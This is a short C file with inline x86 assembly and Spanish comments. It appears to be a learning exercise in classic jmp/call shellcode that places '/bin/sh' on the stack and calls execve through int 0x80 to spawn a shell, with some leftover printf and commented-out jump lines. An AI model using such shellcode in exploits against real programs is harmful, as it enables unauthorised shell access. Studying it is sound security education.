void main(){
__asm__("\n"
	"jmp fee\n"
"foo:\n"
        "popl   %esi\n" // ponemos la direccion del string en %esi 
        "movl   %esi,0x8(%esi)\n" // guardamos la direccion del string al final del string 
	"xorl	%eax, %eax\n" //  0 en %eax
        "movb   %al,0x7(%esi)\n" // caracter nulo al final del string
        "movl   %eax,0xc(%esi)\n"  // ponemos un puntero NULL luego de la direccion del string 
        "movb   $0xb,%al\n" // cargamos el codigo para llamar a execve
        "movl   %esi,%ebx\n" // cargamos el primer argumento de execve (name[0])
        "leal   0x8(%esi),%ecx\n"
        "leal   0xc(%esi),%edx\n"
        "int    $0x80\n"
	"pushl	%esi\n"
	"xorl	%eax, %eax\n"
	"call	printf\n"
	"pop	%esi\n"
	"ret\n"
	//"jmp	0xbffff60c\n"
	//"xorl	%ebx,%ebx\n"
        //"movl   %ebx, %eax\n"
        //"inc    %eax\n"
        //"int    $0x80\n"
"fee:\n"
	"call foo\n"
        ".string \"/bin/sh\"\n"
"\n");
}
